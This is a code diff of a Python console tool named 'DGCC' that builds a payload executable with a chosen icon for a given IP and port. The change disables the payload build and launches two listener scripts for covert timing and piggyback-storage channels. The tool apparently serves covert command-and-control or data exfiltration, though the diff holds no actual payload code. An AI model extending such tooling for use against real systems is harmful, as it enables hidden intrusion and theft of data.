@@ -3,13 +3,14 @@ from art import *
 import sys
 import os
 import socket
-#import sleep
+import HostCovertFile
+import HostPiggybackStorage
+import subprocess
 
 
 #########Front End of the Porgram (Console)
 def console():
     tprint("DGCC", "rnd-large")
-
     filepath = ""
     name = "payload"
     port = 12003
@@ -135,7 +136,14 @@ def makeexe(name, icon):
     #os.rmdir('/__pycache__')
 
 
+def liseners(ip, port):
+    subprocess.Popen('python HostCovertFile.py', creationflags=subprocess.CREATE_NEW_CONSOLE) # Timing Channel
+    subprocess.Popen('python HostPiggybackStorage.py', creationflags=subprocess.CREATE_NEW_CONSOLE) #PiggybackStorage
+
+
 if __name__ == '__main__':
     (filepath, name, Ip, port, icon) = console()
-    payload(filepath, name, Ip, port)
-    makeexe(name, icon)
+    #payload(filepath, name, Ip, port)
+    #makeexe(name, icon)
+    liseners(Ip, port)
+    #pyautogui.hotkey('ctrl', 'esc')
